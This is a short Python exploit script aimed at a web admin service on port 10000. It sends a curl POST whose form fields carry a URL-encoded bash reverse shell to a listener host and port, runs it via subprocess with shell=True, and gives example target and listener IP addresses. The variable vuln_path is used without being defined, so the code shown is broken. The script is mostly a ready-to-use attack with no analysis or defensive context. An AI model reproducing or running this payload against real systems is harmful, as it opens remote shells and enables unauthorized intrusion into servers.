import subprocess

def exploit(target, lhost, lport):
    exploit_target = (
        f"curl -sk -X POST 'https://{target}:10000{vuln_path}' "
        "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
        f"-H 'Referer: https://{target}:10000/' "
        "-H 'Content-Type: application/x-www-form-urlencoded' "
        f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
    )
    subprocess.run(
        exploit_target, shell=True
    )
    print("Exploit script executed successfully.")
    exit()

# Example usage:
target = "192.168.1.67"
lhost = "192.168.1.72"
lport = "4443"
exploit(target, lhost, lport)
